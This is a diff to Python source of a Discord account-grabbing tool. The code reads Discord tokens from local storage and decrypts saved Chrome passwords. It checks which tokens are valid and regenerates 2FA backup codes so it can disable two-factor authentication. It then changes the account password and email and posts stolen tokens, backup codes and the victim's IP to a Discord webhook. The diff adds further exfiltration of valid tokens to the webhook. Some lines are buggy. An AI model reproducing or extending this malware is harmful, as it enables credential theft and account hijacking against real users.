@@ -2,7 +2,7 @@ import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, 
 
 class Grabber:
     def __init__(self):
-        self.webhook = "https://discordapp.com/api/webhooks/some nice webhook url here plz"
+        self.webhook = "https://discordapp.com/api/webhooks/no."
         self.tokenRegex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
         self.api = "https://discordapp.com/api/v7/"
         self.errors = {
@@ -13,7 +13,7 @@ class Grabber:
             self.getAppData() + '\\Discord\\Local Storage\\leveldb'
         ]
         self.passwords = []
-        self.validPassword = [] #need to give it a use to not abuse requests as much :yikes:
+        self.validPassword = [] # <TODO> give it a better use
         self.tokens = []
         self.validTokens = []
         self.backupCodes = []
@@ -28,18 +28,12 @@ class Grabber:
         return headers
 
     def lockOut(self):
-        self.bye2FA() # remove 2fa before operating
         time = datetime.datetime.now().strftime("%H:%M %p")
         newPassword = self.newPassword()
         newEmail = self.newEmail()
         grabIP = self.grabIP()
         encodedBytes = base64.b64encode((str(newEmail)).encode("utf-8"))
         base = str(encodedBytes, "utf-8")
-        for token in self.tokens:
-            r = requests.post(self.api + 'invites/minecraft', headers=self.getHeaders(token))
-            if '302094807046684672' in r.text:
-                if r.status_code == 200:
-                    self.validTokens.append(token)
         for token in self.validTokens:
             for password in self.passwords:
                 userInfo = self.session.get(self.api + 'users/@me', headers=self.getHeaders(token))
@@ -96,24 +90,32 @@ class Grabber:
             for token in self.validTokens:
                 payload = {
                     "password": password,
-                    "regenerate": False
+                    "regenerate": True
                 }
                 r = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/codes', headers=self.getHeaders(token), json=payload)
-                for _i in range(10):
-                    backup = r.json()['backup_codes'][_i]['code']
-                    self.backupCodes.append(backup)
+                with open(f'{self.getAppData}\\Discord Data\\Backup.txt') as f:
+                    f.write(r.json())
+                self.webHookFile(message="Some backup codes", file=f'{self.getAppData}\\Discord Data\\Logger.txt')    
+                for i in range(10):
+                    try:
+                        backup = r.json()['backup_codes'][i]['code']
+                        self.backupCodes.append(backup)
+                    except (KeyError):
+                        self.webHook("[DEBUG] :: User doesn't use 2 factor authentication")    
                 for code in self.backupCodes:
-                    newPayload = {
+                    newPayload = {  
                         'code': code
                     }
                     req = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/totp/disable', headers=self.getHeaders(token), json=newPayload)
                     if req.status_code == 200:
+                        self.webHook("[INFO] :: Successfully disabled 2FA")
                         return True
                     else:
+                        self.webHook("[INFO] :: Couldnt disable 2FA (Maybe not enabled?)")
                         return False
 
-    def grabPassword(self): 
-        # Credits to backslash: https://github.com/backslash
+    def grabPassword(self):
+        # Credits to backslash: https://github.com/backslash for this chunk
         if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
             shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
             conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
@@ -122,7 +124,7 @@ class Grabber:
             for result in cursor.fetchall():
                 password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                 if password != '':
-                    self.passwords.append(password)
+                    self.passwords.append(password)     
 
     def grabToken(self):
         for location in self.dirs:
@@ -135,6 +137,16 @@ class Grabber:
                                 self.tokens.append(token)
                     except (PermissionError):
                         continue
+
+    def checkTokens(self):
+        for token in self.tokens:
+            r = requests.post(self.api + 'invites/pornhub', headers=self.getHeaders(token))
+            if '302094807046684672' in r.text:
+                if r.status_code == 200:
+                    self.validTokens.append(token)
+                    self.webHook(f"[DEBUG] :: Valid token: {token}")
+            else:
+                self.webHook(f"[DEBUG] :: Invalid token: {token}")   
 
     def webHookFile(self, message: str, file): 
         payload = {
@@ -178,8 +190,9 @@ class Grabber:
         data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}, {r.json()["city"]}'
         return data
 
-if __name__ == "__main__":
-    Grabber = Grabber()
-    Grabber.grabPassword()
-    Grabber.grabToken()
-    Grabber.lockOut()
+if __name__ == "__main__": # changing order will most likely fucc the whole code
+    Grabber().grabPassword()
+    Grabber().grabToken()
+    Grabber().checkTokens()
+    Grabber().bye2FA()
+    Grabber().lockOut()
